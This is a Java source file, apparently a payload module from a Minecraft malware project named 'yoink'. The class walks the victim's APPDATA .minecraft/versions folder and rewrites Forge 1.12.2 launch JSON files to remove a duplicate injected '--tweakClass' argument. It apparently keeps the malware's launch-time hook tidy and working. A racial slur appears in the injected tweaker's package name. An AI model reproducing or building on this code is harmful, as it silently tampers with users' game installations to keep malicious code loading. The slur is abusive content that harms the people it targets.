package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;

public final
class DuplicateRemover implements Payload {
    @Override
    public
    void execute () throws Exception {
        File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
        if (file2.isDirectory()) {
            for (File file1 : Objects.requireNonNull(file2.listFiles())) {
                if (file1.isDirectory()) {
                    for (File file : Objects.requireNonNull(file1.listFiles())) {
                        if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge")) {
                            String json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath())) ,StandardCharsets.UTF_8);
                            if (json.contains(" --tweakClass me.nigger.tweaker.Tweaker") && json.contains(" --tweakClass net.minecraftforge.modloader.Tweaker")) {
                                Files.write(Paths.get(file.getAbsolutePath()) ,json.replace(" --tweakClass me.nigger.tweaker.Tweaker" ,"").getBytes(StandardCharsets.UTF_8));
                            }
                        }
                    }
                }
            }
        }
    }
}